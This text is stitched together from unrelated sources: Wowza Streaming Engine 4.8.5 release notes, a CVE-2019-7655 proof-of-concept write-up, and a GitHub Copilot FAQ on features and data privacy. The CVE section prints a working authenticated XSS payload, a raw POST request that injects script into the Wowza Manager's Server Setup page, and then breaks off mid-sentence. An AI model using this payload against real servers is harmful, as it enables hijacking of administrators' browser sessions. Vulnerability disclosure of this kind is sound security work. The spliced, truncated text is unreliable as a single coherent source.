## New features and functionality in Wowza Streaming Engine 4.8.5

---

Wowza Streaming Engine is a robust, customizable, and scalable media server software that powers reliable streaming of high-quality video and audio to any device, anywhere. Wowza Streaming Engine 4.8.5 contains several enhancements and fixes that help to improve the functionality of the media server software.

#### WebRTC updates

Wowza Streaming Engine 4.8.5 includes significant upgrades and fixes for WebRTC functionality. We added support for configuring WebRTC streaming in Wowza Streaming Engine Manager and made WebRTC hosted test pages available for faster learning and testing. Additionally, we improved the accuracy of RTCP feedback messages for adaptive encoding when publishing WebRTC to Wowza Streaming Engine, and we improved the stability of WebRTC session timeouts. We also updated FIR messages to default to a more reliable time-based scheme, which enables a more regular interval for accessing WebRTC streams via a keyframe. For more information about WebRTC and Wowza Streaming Engine, see the following the articles:

* [Set up WebRTC streaming with Wowza Streaming Engine Manager](/docs/set-up-webrtc-streaming-with-wowza-streaming-engine-manager "Set up WebRTC streaming with Wowza Streaming Engine Manager")
* [Set up WebRTC streaming with Wowza Streaming Engine](/docs/how-to-use-webrtc-with-wowza-streaming-engine "Set up WebRTC streaming with Wowza Streaming Engine")
* [WebRTC workflows in Wowza Streaming Engine](/docs/webrtc-workflows-in-wowza-streaming-engine "WebRTC workflows in Wowza Streaming Engine")
* [Ingest RTSP, SRT, or RTMP streams into Wowza Streaming Engine for playback with WebRTC](/docs/ingest-rtsp-srt-or-rtmp-streams-into-wowza-streaming-engine-for-playback-with-webrtc "Ingest RTSP, SRT, or RTMP streams into Wowza Streaming Engine for playback with WebRTC")

#### SRT improvements

Wowza Streaming Engine 4.8.5 offers enhanced support for Secure Reliable Transport (SRT). We now support SRT version 1.4, which provides increased reliability. Other improvements include a number of new and renamed properties for SRT MediaCaster ingest and SRT stream targets and fixes for outstanding issues. For more information on newly available SRT properties, see the following articles:

* [Specify per-stream settings in Wowza Streaming Engine .stream files](/docs/how-to-specify-per-stream-settings-in-stream-files "Specify per-stream settings in Wowza Streaming Engine .stream files")
* [Use SRT to distribute live streams from Wowza Streaming Engine](/docs/how-to-use-srt-to-distribute-live-streams "Use SRT to distribute live streams from Wowza Streaming Engine")

#### Low Latency HLS enhancements

Wowza Streaming Engine 4.8.5 includes adjustments to the Low Latency HLS implementation to keep up-to-date with modifications to Apple’s preliminary protocol extension to the HLS spec. We've added support for the EXT-X-PRELOAD-HINT media playlist tag, removed the HTTP/2 push delivery mechanism, and made other minor changes.

#### Performance upgrades

With Wowza Streaming Engine 4.8.5, we've increased playback performance for connections over SSL/TLS, updated the default server performance tuning, made general WebRTC performance upgrades, and updated MediaCaster ingest performance.

#### Security improvements

In Wowza Streaming Engine 4.8.5, we've fixed Wowza Streaming Engine Manager security concerns related to CSRF, authenticated XSS, and remote authenticated authorization. We've also added support for additional security-related HTTP headers in request responses, and we've enabled stricter Wowza Streaming Engine file access permissions on Linux and macOS.

## Installation and upgrade considerations for Wowza Streaming Engine 4.8.5

---

We've repackaged the version of OpenJDK Java SE JRE 9.0.4 available with the release of Wowza Streaming Engine 4.8.5 to address an issue that caused a memory leak in Wowza Streaming Engine Manager. To take advantage of this fix, use the custom packaged version of OpenJDK when upgrading to Wowza Streaming Engine 4.8.5 or later.

When using the Wowza Streaming Engine 4.8.5 installer to install a new instance of Wowza Streaming Engine on Windows, you may need to install additional dependencies in order to ingest SRT MediaCaster streams or use the generic SRT stream targets destination to publish an SRT stream. To address this, install the latest version of the [Microsoft Visual C++ Redistributable for Visual Studio](https://support.microsoft.com/en-us/help/2977003/the-latest-supported-visual-c-downloads) appropriate to your operating system. This is not an issue for pre-existing installations of Wowza Streaming Engine that are updated to Wowza Streaming Engine 4.8.5.

## Breaking changes in Wowza Streaming Engine 4.8.5

---

If you're updating from a version of Wowza Streaming Engine earlier than 4.8.5, the following file and library changes break functionality if you don't take steps to address them.

### Wowza Streaming Engine REST API breaking changes

The Wowza Streaming Engine REST API authentication method values 'none' and 'basic' are no longer compatible with using Wowza Streaming Engine Manager to control and manage the media server software. If you plan to use Wowza Streaming Engine Manager, use 'digest', 'digestfile', or 'remotehttp' authentication methods instead (location: [install-dir]/conf/Server.xml, <RestInterface>/<AuthenticationMethod>).

### Wowza Streaming Engine built-in HTTP provider breaking changes

To enable security updates for Wowza Streaming Engine Manager, we removed two built-in HTTP providers: HTTPLiveStreamRecord and HTTPStreamManager. The Live Stream Record webpage (http://[wowza-ip-address]:8086/livestreamrecord) and the Stream Manager webpage (http://[wowza-ip-address]:8086/streammanager) are no longer available.

As a replacement for the Stream Manager HTTP provider and webpage, see [Create and use .stream files in Wowza Streaming Engine](/docs/how-to-create-and-use-stream-files-in-wowza-streaming-engine-manager "Create and use .stream files in Wowza Streaming Engine"). Alternatively, see [Create and manage stream files by using the Wowza Streaming Engine REST API](/docs/stream-management-query-examples "Create and manage stream files by using the Wowza Streaming Engine REST API") or [Control Stream class streams dynamically with a Wowza Streaming Engine Java module](/docs/how-to-control-stream-class-streams-dynamically-httpstreamcontrol "Control Stream class streams dynamically with a Wowza Streaming Engine Java module"). A compiled jar file with a customized version of the removed Stream Manager HTTP provider is available with instructions from Wowza support.

As a replacement for the Live Stream Record HTTP provider and webpage, see [Create and manage stream recorders by using the Wowza Streaming Engine REST API](/docs/stream-recording-query-examples "Create and manage stream recorders by using the Wowza Streaming Engine REST API") or [Record live streams in Wowza Streaming Engine](/docs/how-to-record-live-streams-wowza-streaming-engine "Record live streams in Wowza Streaming Engine"). A compiled jar file with a customized version of the removed Live Stream Record HTTP provider is available with instructions from Wowza support.

## Detailed list of changes in Wowza Streaming Engine 4.8.5

---

#### Changes since 4.8.0 release

* Improved the Wowza Streaming Engine updater script to implement stricter file access permissions on Linux and macOS.
* Fixed an issue with the RTPDePacketizerWrapperReChunkMPEGTS property that allowed non-MPEG-TS data to be manipulated.
* Updated the Restlet framework library to version 2.3.12.
* Fixed issue where "@" characters were incorrectly filtered from data saved to XML files using the Wowza Streaming Engine REST API.
* Fixed an issue where HTTP requests routed to HTTP Providers on HostPorts defined in VHost.xml would throw a ConcurrentModificationException.
* Fixed an issue with search functionality in Wowza Streaming Engine Java API reference documentation.
* Added support for the Connection HTTP header in HTTP providers.
* Added a new property (name: cupertinoCacheableSegments, location: [*install-dir*]/conf/[*application name*]/Application.xml, <Application>/<HTTPStreamer>/<Properties>, type: Boolean, default: false) to enable identical segment URLs inside each session media playlist to support caching of segments for live or live edge applications.
* Fixed an issue with returning incorrect H.265 video codec information with calls to get incoming streams using the Wowza Streaming Engine REST API (version 3).
* Fixed an issue that caused a null pointer exception when using the live-record StreamType and specifying a recording file format that is not supported, such as MP3.
* Removed the Wowza Player page from Wowza Streaming Engine Manager.
* Changed the loadBalanceHTTPOutputClasses property name to loadbalanceHTTPOutputClasses in the Dynamic Load Balancing AddOn 4.5 to fix an issue with output classes not loading.

#### WebRTC

* Fixed issue that caused WebRTC playback connections to ignore the maximumPlaybackConnections property for ModuleCoreSecurity.
* Improved the calculation for the jitter value sent in a receiver report for WebRTC MediaCaster ingest. The jitter value is now calculated according to IETF RFC 3550.
* Improved WebRTC publisher and player timeouts as well as resource deallocation.
* Added the ability to block publishing and playing of WebRTC streams when using the IMediaStreamNameAliasProvider3 Java API interface.
* Fixed issues with WebRTC session initiation for streams that used query parameters in their stream names.
* Added support for configuring WebRTC streaming for live applications in Wowza Streaming Engine Manager.
* Added support for enabling WebRTC for Virtual Host host ports in Wowza Streaming Engine Manager.
* Added support for negative acknowledgements (NACK) to make RTCP feedback messages more accurate, which aids in adaptive encoding and reduces packet loss when publishing WebRTC streams to Wowza Streaming Engine.
  + Added support for a jitter buffer for WebRTC streaming that is capable of handling out of order and retransmitted packets. The jitter buffer can be enabled with the rtpDePacketizerWrapper property (location: [*install-dir*]/conf/[*application name*]/Application.xml, <Application>/<RTP>/<Properties>; value: com.wowza.wms.rtp.depacketizer.JitterBuffer).
  + Added support for the following new properties:
    - Added a new property (name: useNack; location: [*install-dir*]/conf/[*application name*]/Application.xml, <Application>/<RTP>/<Properties>; type: Boolean; default: false) to enable sending of NACK messages to publishing clients to allow for retransmission of lost packets. The jitter buffer must also be enabled for this property to work.
    - Added a new property (name: jitterBufferDelay; location: [*install-dir*]/conf/[*application name*]/Application.xml, <Application>/<RTP>/<Properties>; type: integer; default: 500) to configure the delay added by the jitter buffer. The time, in milliseconds, allows for out-of-order and retransmitted packets to be played in order, provided they are received in time.
    - Added a new property (name: jitterBufferDebug; location: [*install-dir*]/conf/[*application name*]/Application.xml, <Application>/<RTP>/<Properties>; type: Boolean; default: false) to debug information about retransmitted packets and whether they were retrieved in time.
    - Added a new property (name: logPacketLoss; location: [*install-dir*]/conf/[*application name*]/Application.xml, <Application>/<RTP>/<Properties>; type: Boolean; default: false) to enable logging when packets are lost.
* Changed the default Full Intra Request (FIR) message scheme to be time based instead of frame based to enable a more regular interval for accessing WebRTC streams via a keyframe.
  + Added support for the following new properties:
    - Added a new property (name: webrtcFIRMessageScheme, location: [*install-dir*]/conf/[*application name*]/Application.xml, <Application>/<WebRTC>/<Properties>, type: string, default: time) that specifies the scheme for the FIR message interval.
    - Added a new property (name: webrtcFIRMessageInterval, location: [*install-dir*]/conf/[*application name*]/Application.xml, <Application>/<WebRTC>/<Properties>, type: integer, default: 1000) that specifies the interval between FIR messages.
  + Deprecated the following properties:
    - webrtcKeyFrameType. Use the webrtcFIRMessageScheme property instead.
    - webrtcKeyFrameTimeInterval. Use the webrtcFIRMessageInterval property instead.
    - webrtcKeyFrameTimeIntervalThreshold. No replacement is needed.
* Fixed an issue with WebRTC streams sent over TCP not maintaining a high bitrate.
* Fixed an issue with the format of RTCP receiver reports by including an SDES packet containing a CNAME for WebRTC MediaCaster ingest.
* Removed Vorbis from the list of preferred audio codecs for WebRTC in Application.xml.
* Fixed an issue with the server failing to start up properly when a virtual host was configured to listen for WebRTC WebSocket connections on a HostPort that did not have SSL/TLS enabled.
* Fixed an issue with UDP sessions sometimes failing to close for WebRTC sessions due to a race condition.

#### RTP/RTSP

* Fixed an issue with RTSP streaming that caused a null pointer exception to occur when using a jitter buffer.
* Added support for IP address message filtering for UDP messages received within an RTSP or RTP/RTCP session. This filtering can eliminate stream cross-talk when a disconnected RTSP source continues to send UDP messages to the same ports after the ports have been reallocated to a new RTSP connection.
  + Added a new property to enable IP address message filtering on RTSP streams (name: rtspCheckIpAddresses, type: Boolean, path: Root/Application/RTP, default: false).
  + For applications that support RTSP sources that use different IP addresses for their RTSP and RTP/RTCP communications, IP address filtering for RTSP streams shouldn't be enabled. If it is enabled, all packets will be dropped.
* Updated the name of the property used to enable debug logging for RTSP streams (name: rtspDebugSession, path: Root/Application/RTP, type: Boolean,  default: false). The property can also be used in a .stream file to affect only the steam associated with the file. This property replaces rtpDebugSession.

#### SRT

* Updated the SRT implementation to version 1.4 for increased reliability.
* Fixed an issue where the onStreamStop() callback for SRT sometimes had a null stream. There is always a stream object available when calling mediacaster.getStream().
* Fixed a memory leak that could be caused by disconnecting and reconnecting SRT MediaCaster streams.
* Made the following updates to .stream file properties for SRT MediaCaster ingest:
  + Deprecated the following properties:
    - srtDataTimeout. Use the streamTimeout parameter instead (name: streamTimeout; location: [*install-dir*]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: Integer). This prompts Wowza Streaming Engine to monitor the stream. If a break occurs in the stream that's longer than the streamTimeout value, in milliseconds, it resets the connection to the camera.
    - srtTrafficType. There is no replacement needed.
    - SendBufferSize. There is no replacement needed.
    - SendBufferSizeUDP. There is no replacement needed.
  + Renamed the following properties:
    - The srtLatency property (name: srtLatency; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 400) replaces srtRecoveryBuffer and specifies the latency, in milliseconds. This is the time it takes for a UDP packet to be sent and delivered, including the time required to account for sending and retransmitting lost packets. The srtLatency value should be 2.5 times the round trip time (RTT). When peers set different latency values, the maximum of the two values applies to both peers.
    - The srtReceiveBufferSize property (name: srtReceiveBufferSize; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 12058624) replaces receiveBufferSize and specifies the receive buffer size, in bytes.
    - The srtReceiveBufferSizeUDP property (name: srtReceiveBufferSizeUDP; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 12288000) replaces receiveBufferSizeUDP and specifies the receive buffer size for UDP connections, in bytes.
    - The srtTimestampBasedDeliveryMode property (name: srtTimestampBasedDeliveryMode; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: Boolean; default: true) replaces srtTimeMode and specifies whether the SRT time-stamp based packet delivery mode is enabled.
    - The srtTooLatePacketDrop property (name: srtTooLatePacketDrop; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: Boolean; default: true) replaces srtLatePacketDrop and specifies whether all packets that are received late are dropped.
  + Added support for the following new properties:
    - Added a new property (name: srtDebug; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: Boolean; default: false) that specifies whether to write additional details to log files for SRT workflow debugging.
    - Added a new property (name: srtFlightFlagSize; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 25600) that specifies the maximum number of bytes that can be sent without being acknowledged.
    - Added a new property (name: srtInputBandwidth; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 0) that works with srtOverheadBandwidth to specificy the maximum bandwidth, only if srtMaximumBandwidth is set to 0. Uses this formula: max bandwidth = input bandwidth \* (100 + overhead bandwidth)/100. If srtInputBandwidth is set to 0, then input bandwidth is estimated from the rate of input during transmission.
    - Added a new property (name: srtKeyAnnounce; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 0x1000) that specifies the interval between when a new encryption key is sent and when switchover occurs. This value also applies to the subsequent interval between when switchover occurs and when the old encryption key is decommissioned.
    - Added a new property (name: srtKeyRefreshRate; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 0x1000000) that specifies the number of packets to be transmitted with an encryption key before switching to a new key.
    - Added a new property (name: srtMaximumBandwidth; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: -1) that specifies the maximum bandwidth, in bytes per second, that the connection can use. Valid values are -1 (infinite), 0 (calculated from srtInputBandwidth and srtOverheadBandwidth), and integers greater than 0 for an absolute limit in bytes per second.
    - Added a new property (name: srtMaximumSegmentSize; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 1500) that specifies the maximum size for a unit of transfer data (MTU), in bytes. For MPEG-TS streams, use the default.
    - Added a new property (name: srtOverheadBandwidth; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 25) that works with srtInputBandwidth to specificy the maximum bandwidth, only if srtMaximumBandwidth is set to 0. Uses this formula: max bandwidth = input bandwidth \* (100 + overhead bandwidth)/100.
    - Added a new property (name: srtPacketLossTolerance; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 0) that specifies the maximum packet reorder tolerance, which is the number of packets to receive after loss before sending a loss report. When set to 0, the loss report is sent immediately when there is a gap in a sequence.
    - Added a new property (name: srtReconnectWaitTime; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 3000) that specifies, in milliseconds, how often the listener looks for an incoming stream. If a source drops, and the immediate reconnection attempt fails, the system waits this amount of time before looking for an incoming stream again.
    - Added a new property (name: srtSendNakReports; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: Boolean; default: true) that enables the receiver to send periodic NAK (Negative Acknowledgment) packet reports.
    - Added a new property (name: srtTimesToPrintStats; location: [install-dir]/conf/[*application name*]/Application.xml, <Application>/<MediaCaster>/<Properties>; type: integer; default: 0) that specifies how many times stream statistics are written into the log after the stream starts. Statistics are logged each second. Set to -1 to log statistics indefinitely.
* Previously added SRT properties for SRT MediaCaster ingest can now be configured in Wowza Streaming Engine Manager.
* Made the following updates to SRT Stream Target properties, which can be configured in Wowza Streaming Engine Manager or the PushPublishMap.txt file:
  + Renamed the following property:
    - The srtLatency property (name: srtLatency, type: Integer, default: 400) replaces Recovery Buffer and specifies the latency, in milliseconds. This is the time it takes for a UDP packet to be sent and delivered, including the time required to account for sending and retransmitting lost packets. The srtLatency value should be 2.5 times the round trip time (RTT). When peers set different latency values, the maximum of the two values applies to both peers.
  + Added support for the following new properties:
    - Added a new property (name: srtConnectTimeout, type: integer, default: 3000) that specifies how long Wowza Streaming Engine waits for a target to respond to a connection request.
    - Added a new property (name: srtFlightFlagSize, type: integer, default: 25600) that specifies the maximum number of bytes that can be sent without being acknowledged.
    - Added a new property (name: srtInputBandwidth, type: integer, default: 0) that works with srtOverheadBandwidth to specify the maximum bandwidth, only if srtMaximumBandwidth is set to 0. Uses this formula: max bandwidth = input bandwidth \* (100 + overhead bandwidth)/100. If srtInputBandwidth is set to 0, then input bandwidth is estimated from the rate of input during transmission.
    - Added a new property (name: srtKeyAnnounce, type: integer, default: 0x1000) that specifies the interval between when a new encryption key is sent and when switchover occurs. This value also applies to the subsequent interval between when switchover occurs and when the old encryption key is decommissioned.
    - Added a new property (name: srtKeyRefreshRate, type: integer, default: 0x1000000) that specifies the number of packets to be transmitted with an encryption key before switching to a new key.
    - Added a new property (name: srtMaximumBandwidth, type: integer, default: -1) that specifies the maximum bandwidth, in bytes per second, that the connection can use. Valid values are -1 (infinite), 0 (calculated from srtInputBandwidth and srtOverheadBandwidth), and integers greater than 0 for an absolute limit in bytes per second.
    - Added a new property (name: srtMaximumSegmentSize, type: integer, default: 1500) that specifies the maximum size for a unit of transfer data (MTU), in bytes. For MPEG-TS streams, use the default.
    - Added a new property (name: srtOverheadBandwidth, type: integer, default: 25) that works with srtInputBandwidth to specify the maximum bandwidth, only if srtMaximumBandwidth is set to 0. Uses this formula: max bandwidth = input bandwidth \* (100 + overhead bandwidth)/100.
    - Added a new property (name: srtPeerIdleTimeout, type: integer, default: 5000) that specifies, in milliseconds, the peer idle timeout, or the maximum time of silence heard from a peer.
    - Added a new property (name: srtStreamId, type: string, default: none) that populates a string sent on the socket prior to connecting. Length is a maximum of 512 characters. If using a stream ID, a peer connection must have a minimum SRT version of 1.3.
    - Added a new property (name: srtSendBufferSize, type: integer, default: 12058624) that specifies the send buffer size, in bytes.
    - Added a new property (name: srtSendBufferSizeUDP, type: integer, default: 65536) that specifies the send buffer size for UDP connections, in bytes.
    - Added a new property (name: srtTimesToPrintStats, type: integer, default: 0) that specifies how many times stream statistics are written into the log after the stream starts. Statistics are logged each second. Set to -1 to log statistics indefinitely.

#### HLS, Low-Latency HLS, and CMAF

* Fixed an issue with Low Latency HLS that caused player requests for partial segments associated with completed media segments to fail with 404 resource not found errors.
* Removed support for the HTTP/2 push delivery mechanism.
* Added support for the EXT-X-PRELOAD-HINT media playlist tag.
* Added support for blocking partial segment requests based on EXT-X-PRELOAD-HINT tags.
* Added support for setting PART-HOLD-BACK in all media playlists in a multi-rendition, adaptive-bitrate playback session to at least three times the maximum PART-TARGET value across the renditions.

#### MPEG-DASH

* Fixed an issue with the Wowza Streaming Engine Java API that caused the LiveStreamPacketizer to fail to set a value for the mpegdashSegmentDurationTarget property.
* Fixed an issue with CMAF-packetized MPEG-DASH live stream encryption using key files. Previously, including both mpegdashstreaming-cenc and cmafstreaming-cenc entries in a key file could result in the generation of an invalid MPD file.
* Added millisecond precision to dates for the availibilityStartTime and publishTime properties in MPEG-DASH MPD manifest files for live applications.
* Fixed an issue with the sample duration value under MP4 track headers that was causing playback issues for MPEG-DASH VOD streams on ExoPlayer players in Android apps.
* Fixed an issue with increasing heap memory with MPEG-DASH stream targets when Playlist Count (http.playlistCount) was set to a high value.
* Fixed an issue with the mpegdashSegmentDurationTarget property not being read correctly for MPEG-DASH VOD streams.
* Fixed an issue with setting the Akamai Event Name and Adaptive Group properties and enabling relative playlists (http.relativePlaylists) for MPEG-DASH Akamai stream targets that resulted in an incorrect BaseURL value in MPEG-DASH MPD manifest files.
* Fixed an issue with setting the Akamai Event Name property, setting the Destination Server property to redundant, and enabling relative playlists (http.relativePlaylists) for MPEG-DASH Akamai stream targets that resulted in an incorrect primary BaseURL value in MPEG-DASH MPD manifest files.

#### Live Stream Encoding, Decoding, Transcoding, and Transrating

* Fixed a performance regression when using NVIDIA hardware accelerated decoding on multiple graphics cards that lead to dropped frames before hardware limits were reached.
* Fixed an issue that created extra transcoding sessions and didn't clean them up properly.
* Fixed an issue with RTMP streams that use H.264 Annex B start codes not processing.
* Fixed an issue with decoded frame sizes not updating correctly when accessed through the video decoder API in the Wowza Streaming Engine Java API.
* Fixed an issue that caused transcoder sessions to not close down properly when quickly republishing a stream.

#### Stream Targets (Push Publishing)

* Fixed an issue that caused the creation of duplicate Group Manager, Wowza Streaming Cloud, and Wowza CDN stream target sessions when a new target was added, an existing target was modified or restarted, or targets were enabled.
* Fixed an issue with HLS-based stream targets where a restart of a stream's Cupertino packetizer due to source stream issues resulted in associated stream targets failing to push the stream.

#### Live Stream DVR Playback (Wowza nDVR)

* Added a new interface, IDvrConverterActionNotify, for the Wowza Streaming Engine Java API. This interface invokes onConversionComplete after DVR conversion finishes, sending a notification to registered onConversionComplete listeners with the DVR store handle and the converted file’s name.
* Fixed an issue with MPEG-DASH nDVR functionality that caused video duration to decrease during playback.
* Fixed an issue with the dvrPacketSortTime property. When dvrPacketSortTime was set to add latency to DVR playback, additional unnecessary log messages appeared in the log file. With updated behavior, logs show a single entry when a problem arises in the DVR stream.

#### Performance improvements

* Improved performance of players connecting over SSL/TLS for TCP streaming.
* Updated the MediaCaster transport handler to use the VHost transport thread pool to increase throughput when many MediaCaster streams are used.
* Increased the defaults for Java heap size and several thread counts when using auto-tuning to better match modern hardware capabilities and increase server throughput.
* Updated the Wowza Streaming Engine Manager limits for Java heap size and thread counts to better match modern hardware capabilities.

#### Security improvements

* Added support for the following security-related HTTP headers in request responses with Content-Type: text/html:
  + Content-Security-Policy: default-src 'self'
  + X-Frame-Options: deny
  + X-XSS-Protection: 1; mode=block
  + X-Content-Type-Options: nosniff
  + Referrer-Policy: no-referrer
* Upgraded the jQuery library to version 3.5.1.
* Fixed several issues with authenticated XSS security vulnerabilities in Wowza Streaming Engine Manager.
* Fixed several issues with CSRF security vulnerabilities in Wowza Streaming Engine Manager.
* Fixed an issue with a remote authenticated authorization bypass security vulnerability that could allow an unauthorized user to make changes in Wowza Streaming Engine Manager.

# CVE-2019-7655-XSS-Wowza

Wowza Streaming Engine 4.7.7 and 4.7.8 suffers from multiple authenticated XSS vulnerabilities via the (1) customList%5B0%5D.value field in enginemanager/server/serversetup/edit\_adv.htm of the Server Setup configuration or the (2) host field in enginemanager/j\_spring\_security\_check of the login form.

### XSS(1)

User input is used inside a javascript function. By crafting a special payload, it is possible to alter the function and inject malicious content without breaking functionality.

By sending the following payload:
```
POST /enginemanager/server/serversetup/edit_adv.htm HTTP/1.1
Host: 172.17.60.171:8088
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

Connection: close

vhost=_defaultVHost_&advSection=Custom&customList%5B0%5D.documented=false&customList%5B0%5D.enabled=true&customList%5B0%5D.type=String&customList%5B0%5D.sectionName=Server&customList%5B0%5D.section=%2FRoot%2FServer&customList%5B0%5D.name=asdasd&customList%5B0%5D.removed=false&customList%5B0%5D.value=asala";} alert("XSS ServerSetup"); if("true") { var a = "&advPath=%2FRoot%2FServer

```

The initTableDataProperties() function gets injected with malitious code:
```

<script>
var tblDataProperties = new Array();
var tblIdxProperties=0;

initTableDataProperties();
updateTableProperties();

function initTableDataProperties()
{

		if("true")
		{
			var newItem = new Object();
			newItem.orgIdx = tblIdxProperties++;
			newItem.added=false;
			newItem.removed="false"==="true";
			newItem.enabled="true"==="true";
			newItem.name="asdasd";
			newItem.value="asala";} alert("XSS ServerSetup"); if("true") { var a = "";
			newItem.type="String";
			newItem.section="/Root/Server";
			newItem.sectionName="Server";
			newItem.documented="false"==="true";
			newItem.uiBooleanValue="false"==="true";
			tblDataProperties.push(newItem);
		}

}
***TRUNCATED***

```

The injected code runs in the client browser:

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

